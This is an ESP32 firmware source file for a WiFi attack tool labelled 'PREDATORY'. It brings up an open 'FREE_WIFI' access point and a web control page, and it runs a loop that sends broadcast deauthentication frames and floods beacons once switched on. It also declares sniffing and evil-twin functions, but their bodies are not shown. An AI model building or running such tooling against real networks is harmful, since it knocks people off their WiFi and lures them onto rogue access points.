#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "nvs_flash.h"
#include "esp_netif.h"
#include "esp_log.h"

static const char *TAG = "PREDATORY";

void deauth_attack(uint8_t *bssid);
void beacon_flood(char *ssid);
void start_sniffing(void);
void evil_twin_start(char *target_ssid);
void rickroll_start(void);
void start_web_server(void);

// متغير للتحكم في الهجمات
int attacks_running = 0;  // = 0 يعني الهجمات موقفة

void attack_loop(void *pv) {
    ESP_LOGI(TAG, "Attack loop started!");
    while(1) {
        if (attacks_running) {
            uint8_t bssid[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
            deauth_attack(bssid);
            beacon_flood("FREE_WIFI");
        }
        vTaskDelay(500 / portTICK_PERIOD_MS);
    }
}

// دالة لتشغيل الهجمات (تستدعى من الويب)
void start_attacks(void) {
    attacks_running = 1;
    ESP_LOGI(TAG, "Attacks started!");
}

// دالة لإيقاف الهجمات (تستدعى من الويب)
void stop_attacks(void) {
    attacks_running = 0;
    ESP_LOGI(TAG, "Attacks stopped!");
}

void start_ap(void) {
    ESP_LOGI(TAG, "Configuring AP...");
    
    wifi_config_t ap_config = {
        .ap = {
            .ssid = "FREE_WIFI",
            .ssid_len = 9,
            .password = "",
            .channel = 1,
            .authmode = WIFI_AUTH_OPEN,
            .max_connection = 4,
            .beacon_interval = 100,
        },
    };
    
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    esp_wifi_start();
    
    ESP_LOGI(TAG, "AP Started: FREE_WIFI");
}

void app_main(void) {
    ESP_LOGI(TAG, "=== APP STARTING ===");
    
    // تهيئة NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_LOGI(TAG, "Erasing NVS...");
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);
    
    // تهيئة الشبكة
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    
    // تهيئة WiFi
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    
    // تشغيل AP
    start_ap();
    
    // تشغيل خادم الويب
    start_web_server();
    
    // تأخير للتأكد من استقرار AP
    vTaskDelay(2000 / portTICK_PERIOD_MS);
    
    // تشغيل حلقة الهجمات (لكن موقفة)
    xTaskCreate(attack_loop, "attack_loop", 4096, NULL, 5, NULL);
    
    ESP_LOGI(TAG, "=== SYSTEM READY ===");
    ESP_LOGI(TAG, "Connect to FREE_WIFI and visit 192.168.4.1");
    ESP_LOGI(TAG, "ATTACKS ARE STOPPED BY DEFAULT. Use web interface to start.");
}
